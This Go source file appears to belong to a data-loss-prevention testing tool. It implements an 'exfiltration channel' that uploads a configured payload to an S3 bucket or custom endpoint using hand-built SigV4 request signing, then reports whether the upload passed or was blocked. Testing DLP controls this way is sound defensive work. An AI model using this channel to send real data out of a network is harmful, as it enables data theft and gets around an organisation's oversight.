// Package s3 implements an AWS S3 PUT exfiltration channel simulation.
// Uses the AWS Signature Version 4 signing algorithm over raw HTTP —
// no AWS SDK dependency required.
package s3

import (
	"bytes"
	"context"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"net/http"
	"strings"
	"time"

	"github.com/hssn-research/dlpbuster/internal/channels"
)

// Channel implements channels.Channel for AWS S3 exfiltration.
type Channel struct{}

// New returns a new S3 Channel.
func New() *Channel { return &Channel{} }

// Name returns the channel identifier.
func (c *Channel) Name() string { return "s3" }

// Description returns a one-line description.
func (c *Channel) Description() string {
	return "Simulate data exfiltration via AWS S3 PUT to a configured bucket"
}

// Run executes an S3 PUT with SigV4 signing.
func (c *Channel) Run(ctx context.Context, cfg channels.ChannelConfig) channels.Result {
	result := channels.Result{Channel: c.Name()}
	start := time.Now()

	if cfg.S3Bucket == "" {
		result.Status = channels.StatusSkipped
		result.Evidence = []string{"s3: no bucket configured"}
		result.Duration = time.Since(start)
		return result
	}

	region := cfg.S3Region
	if region == "" {
		region = "us-east-1"
	}

	now := time.Now().UTC()
	dateStamp := now.Format("20060102")
	amzDate := now.Format("20060102T150405Z")
	objectKey := fmt.Sprintf("dlpbuster/%s/payload.bin", now.Format("2006-01-02T15-04-05"))

	// Support anonymous/public endpoint override (e.g. MinIO, public test buckets).
	baseURL := cfg.S3Endpoint
	if baseURL == "" {
		baseURL = fmt.Sprintf("https://%s.s3.%s.amazonaws.com", cfg.S3Bucket, region)
	} else {
		baseURL = strings.TrimRight(baseURL, "/") + "/" + cfg.S3Bucket
	}
	url := fmt.Sprintf("%s/%s", baseURL, objectKey)

	body := cfg.Payload
	payloadHash := sha256Hex(body)

	awsHost := fmt.Sprintf("%s.s3.%s.amazonaws.com", cfg.S3Bucket, region)
	if cfg.S3Endpoint != "" {
		// For custom endpoint, host is just the endpoint host without the bucket path.
		awsHost = strings.TrimPrefix(cfg.S3Endpoint, "https://")
		awsHost = strings.TrimPrefix(awsHost, "http://")
		awsHost = strings.Split(awsHost, "/")[0]
	}

	headers := map[string]string{
		"host":                 awsHost,
		"x-amz-content-sha256": payloadHash,
		"x-amz-date":           amzDate,
		"content-type":         "application/octet-stream",
	}

	var signedHeaders string
	var canonicalHeaders string
	if cfg.S3AccessKey != "" && cfg.S3SecretKey != "" {
		signedHeaders, canonicalHeaders = buildCanonicalHeaders(headers)
		authHeader := sigV4Auth(cfg.S3AccessKey, cfg.S3SecretKey, region, "s3",
			dateStamp, amzDate, "PUT", "/"+objectKey, "", canonicalHeaders, signedHeaders, payloadHash)
		headers["authorization"] = authHeader
	}

	req, err := http.NewRequestWithContext(ctx, http.MethodPut, url, bytes.NewReader(body))
	if err != nil {
		result.Status = channels.StatusError
		result.Error = fmt.Errorf("s3: build request: %w", err)
		result.Duration = time.Since(start)
		return result
	}

	for k, v := range headers {
		req.Header.Set(k, v)
	}

	client := &http.Client{Timeout: 15 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		result.Status = channels.StatusBlocked
		result.Evidence = []string{fmt.Sprintf("s3: PUT failed: %v", err)}
		result.Duration = time.Since(start)
		return result
	}
	defer resp.Body.Close()

	evidence := []string{fmt.Sprintf("PUT %s → %d %s", url, resp.StatusCode, http.StatusText(resp.StatusCode))}

	if resp.StatusCode >= 200 && resp.StatusCode < 300 {
		result.Status = channels.StatusPassed
		result.BytesSent = len(body)
	} else {
		result.Status = channels.StatusBlocked
	}
	result.Evidence = evidence
	result.Duration = time.Since(start)
	return result
}

// --- SigV4 helpers ---

func sha256Hex(data []byte) string {
	h := sha256.Sum256(data)
	return hex.EncodeToString(h[:])
}

func hmacSHA256(key, data []byte) []byte {
	h := hmac.New(sha256.New, key)
	h.Write(data)
	return h.Sum(nil)
}

func sigV4DerivedKey(secretKey, dateStamp, region, service string) []byte {
	kDate := hmacSHA256([]byte("AWS4"+secretKey), []byte(dateStamp))
	kRegion := hmacSHA256(kDate, []byte(region))
	kService := hmacSHA256(kRegion, []byte(service))
	return hmacSHA256(kService, []byte("aws4_request"))
}

func buildCanonicalHeaders(headers map[string]string) (signedHeaders, canonicalHeaders string) {
	keys := make([]string, 0, len(headers))
	for k := range headers {
		keys = append(keys, strings.ToLower(k))
	}
	// Sort deterministically
	for i := 0; i < len(keys)-1; i++ {
		for j := i + 1; j < len(keys); j++ {
			if keys[i] > keys[j] {
				keys[i], keys[j] = keys[j], keys[i]
			}
		}
	}
	var sb strings.Builder
	for _, k := range keys {
		sb.WriteString(k)
		sb.WriteString(":")
		sb.WriteString(strings.TrimSpace(headers[k]))
		sb.WriteString("\n")
	}
	return strings.Join(keys, ";"), sb.String()
}

func sigV4Auth(accessKey, secretKey, region, service, dateStamp, amzDate,
	method, uri, queryString, canonicalHeaders, signedHeaders, payloadHash string) string {

	canonicalRequest := strings.Join([]string{
		method, uri, queryString, canonicalHeaders, signedHeaders, payloadHash,
	}, "\n")

	credentialScope := strings.Join([]string{dateStamp, region, service, "aws4_request"}, "/")
	stringToSign := strings.Join([]string{
		"AWS4-HMAC-SHA256",
		amzDate,
		credentialScope,
		sha256Hex([]byte(canonicalRequest)),
	}, "\n")

	signingKey := sigV4DerivedKey(secretKey, dateStamp, region, service)
	sig := hex.EncodeToString(hmacSHA256(signingKey, []byte(stringToSign)))

	return fmt.Sprintf("AWS4-HMAC-SHA256 Credential=%s/%s,SignedHeaders=%s,Signature=%s",
		accessKey, credentialScope, signedHeaders, sig)
}
